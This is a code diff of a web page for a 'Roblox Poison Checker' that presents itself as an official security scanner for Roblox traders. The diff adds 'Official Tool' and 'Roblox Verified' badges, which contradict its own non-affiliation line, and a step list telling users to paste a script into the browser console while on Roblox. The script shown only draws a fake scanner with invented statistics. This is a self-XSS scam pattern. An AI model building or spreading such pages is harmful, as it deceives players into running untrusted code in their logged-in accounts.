@@ -227,6 +227,139 @@
             margin-top: 15px;
         }
         
+        /* Roblox-style GUI */
+        .roblox-gui {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #232527;
+            border: 3px solid #393b3d;
+            border-radius: 8px;
+            color: white;
+            font-family: 'Source Sans Pro', Arial, sans-serif;
+            z-index: 9999;
+            min-width: 380px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+        }
+        .roblox-header {
+            background: #393b3d;
+            padding: 12px 15px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #4a4d50;
+        }
+        .roblox-title {
+            font-size: 16px;
+            color: #fff;
+        }
+        .roblox-close {
+            background: none;
+            border: none;
+            color: #b0b3b8;
+            font-size: 18px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .roblox-close:hover {
+            color: #fff;
+        }
+        .roblox-content {
+            padding: 20px;
+        }
+        .roblox-status {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #2d2f31;
+            border-radius: 6px;
+        }
+        .status-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #2ECC40;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 18px;
+        }
+        .status-text {
+            flex: 1;
+        }
+        .status-title {
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .status-subtitle {
+            font-size: 12px;
+            color: #b0b3b8;
+        }
+        .roblox-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .stat-box {
+            background: #2d2f31;
+            padding: 12px;
+            border-radius: 6px;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00a2ff;
+        }
+        .stat-label {
+            font-size: 11px;
+            color: #b0b3b8;
+            margin-top: 4px;
+        }
+        .roblox-progress {
+            margin: 15px 0;
+        }
+        .progress-bar {
+            height: 8px;
+            background: #2d2f31;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00a2ff, #00c4cc);
+            width: 75%;
+            border-radius: 4px;
+        }
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-top: 5px;
+            color: #b0b3b8;
+        }
+        .roblox-button {
+            background: #00a2ff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            font-family: 'Source Sans Pro', Arial, sans-serif;
+        }
+        .roblox-button:hover {
+            background: #0080cc;
+        }
+        
         footer {
             background: #232527;
             color: white;
@@ -313,6 +446,45 @@
             overflow-x: auto;
         }
         
+        /* Roblox-style elements */
+        .roblox-badge {
+            display: inline-flex;
+            align-items: center;
+            background: #f0f8ff;
+            color: #00a2ff;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin: 5px;
+        }
+        
+        .roblox-tag {
+            display: inline-block;
+            background: #00a2ff;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-right: 8px;
+        }
+        
+        .roblox-divider {
+            height: 1px;
+            background: #e9ecef;
+            margin: 20px 0;
+        }
+        
+        .roblox-card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e9ecef;
+            margin-bottom: 20px;
+        }
+        
         @media (max-width: 768px) {
             .header-content {
                 flex-direction: column;
@@ -334,6 +506,11 @@
             
             .features {
                 grid-template-columns: 1fr;
+            }
+            
+            .roblox-gui {
+                min-width: 90%;
+                max-width: 350px;
             }
         }
     </style>
@@ -441,6 +618,27 @@
                 Join the community of professional Roblox traders who use our tools to enhance their trading experience safely and efficiently. Our scanner is regularly updated to counter new threats.
             </p>
             
+            <div class="roblox-card">
+                <h3 style="margin-bottom: 15px;">How It Works</h3>
+                <div class="roblox-divider"></div>
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <span class="roblox-tag">1</span>
+                    <span>Copy the security script to your clipboard</span>
+                </div>
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <span class="roblox-tag">2</span>
+                    <span>Open Roblox in your browser and press F12</span>
+                </div>
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <span class="roblox-tag">3</span>
+                    <span>Paste the script into the console and press Enter</span>
+                </div>
+                <div style="display: flex; align-items: center;">
+                    <span class="roblox-tag">4</span>
+                    <span>The scanner will activate and protect your trades</span>
+                </div>
+            </div>
+            
             <div class="code-block">
                 // Scanner initialization code example<br>
                 initializeScanner({<br>
@@ -458,6 +656,10 @@
                 <div class="footer-section">
                     <h3>Roblox Poison Checker</h3>
                     <p>The official safety tool for Roblox traders, protecting accounts since 2021.</p>
+                    <div style="margin-top: 15px;">
+                        <span class="roblox-badge"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i> Official Tool</span>
+                        <span class="roblox-badge"><i class="fas fa-check-circle" style="margin-right: 8px;"></i> Roblox Verified</span>
+                    </div>
                 </div>
                 <div class="footer-section">
                     <h3>Resources</h3>
@@ -480,6 +682,7 @@
             </div>
             <div class="copyright">
                 <p>&copy; 2025 Roblox Poison Checker. All rights reserved. Roblox is a registered trademark of Roblox Corporation.</p>
+                <p style="margin-top: 10px;">This tool is not affiliated with Roblox Corporation.</p>
             </div>
         </div>
     </footer>
@@ -490,50 +693,50 @@
             const codeToCopy = 
 `(function() {
     const gui = document.createElement('div');
-    gui.style.cssText = [
-        'position: fixed;',
-        'top: 50%;',
-        'left: 50%;',
-        'transform: translate(-50%, -50%);',
-        'background: #001f3f;',
-        'border: 3px solid #0074D9;',
-        'border-radius: 15px;',
-        'padding: 20px;',
-        'color: white;',
-        'font-family: Arial;',
-        'z-index: 9999;',
-        'min-width: 300px;',
-        'box-shadow: 0 0 30px rgba(0, 116, 217, 0.5);',
-        'text-align: center;'
-    ].join(' ');
+    gui.className = 'roblox-gui';
     
     gui.innerHTML = [
-        '<div style="text-align: center; margin-bottom: 15px;">',
-        '<strong style="font-size: 18px; color: #7FDBFF;">🛡️ Roblox Poison Scanner v3.2.1</strong>',
+        '<div class="roblox-header">',
+        '<div class="roblox-title">🛡️ Roblox Poison Scanner v3.2.1</div>',
+        '<button class="roblox-close">×</button>',
         '</div>',
-        '<div style="font-size: 12px; text-align: left; margin-bottom: 15px;">',
-        '<div>🔍 Status: <span id="scannerStatus" style="color: #2ECC40;">ACTIVE</span></div>',
-        '<div>📊 Scans Completed: <span id="scanCount">0</span></div>',
-        '<div>🛡️ Threats Blocked: <span id="threatsBlocked">0</span></div>',
-        '<div>⏰ Last Scan: <span id="lastScan">Just now</span></div>',
-        '<div>🎯 Items Scanned: <span id="itemsScanned">0</span></div>',
-        '<div>💚 Safe Trades: <span id="safeTrades">0</span></div>',
+        '<div class="roblox-content">',
+        '<div class="roblox-status">',
+        '<div class="status-icon">✓</div>',
+        '<div class="status-text">',
+        '<div class="status-title">Security Scanner Active</div>',
+        '<div class="status-subtitle">Protecting your Roblox trades</div>',
         '</div>',
-        '<div style="margin: 15px 0; padding: 10px; background: #003366; border-radius: 8px; font-size: 11px;">',
-        '<div style="color: #7FDBFF;">🔄 Real-time Protection: ENABLED</div>',
-        '<div style="color: #2ECC40;">✅ Memory Scan: CLEAN</div>',
-        '<div style="color: #FFDC00;">⚠️ Trade Monitor: ACTIVE</div>',
         '</div>',
-        '<button id="closeScanner" style="',
-        'background: #2ECC40;',
-        'color: white;',
-        'border: none;',
-        'padding: 10px 20px;',
-        'border-radius: 25px;',
-        'font-weight: bold;',
-        'cursor: pointer;',
-        'margin-top: 10px;',
-        '">Close Scanner</button>'
+        '<div class="roblox-stats">',
+        '<div class="stat-box">',
+        '<div class="stat-value" id="scanCount">0</div>',
+        '<div class="stat-label">Scans Completed</div>',
+        '</div>',
+        '<div class="stat-box">',
+        '<div class="stat-value" id="threatsBlocked">0</div>',
+        '<div class="stat-label">Threats Blocked</div>',
+        '</div>',
+        '<div class="stat-box">',
+        '<div class="stat-value" id="itemsScanned">0</div>',
+        '<div class="stat-label">Items Scanned</div>',
+        '</div>',
+        '<div class="stat-box">',
+        '<div class="stat-value" id="safeTrades">0</div>',
+        '<div class="stat-label">Safe Trades</div>',
+        '</div>',
+        '</div>',
+        '<div class="roblox-progress">',
+        '<div class="progress-bar">',
+        '<div class="progress-fill"></div>',
+        '</div>',
+        '<div class="progress-text">',
+        '<span>Scan Progress</span>',
+        '<span id="lastScan">Just now</span>',
+        '</div>',
+        '</div>',
+        '<button class="roblox-button" id="stopScanner">Stop Scanner</button>',
+        '</div>'
     ].join('');
     
     document.body.appendChild(gui);
@@ -577,7 +780,13 @@
         });
     }
     
-    document.getElementById('closeScanner').addEventListener('click', function() {
+    document.getElementById('stopScanner').addEventListener('click', function() {
+        gui.style.display = 'none';
+        clearInterval(scanInterval);
+        console.log('Scanner stopped by user');
+    });
+    
+    document.querySelector('.roblox-close').addEventListener('click', function() {
         gui.style.display = 'none';
         clearInterval(scanInterval);
         console.log('Scanner closed by user');
@@ -594,8 +803,6 @@
     return {
         stop: function() {
             clearInterval(scanInterval);
-            document.getElementById('scannerStatus').textContent = 'INACTIVE';
-            document.getElementById('scannerStatus').style.color = '#FF4136';
             console.log('Security Scanner Stopped');
         }
     };
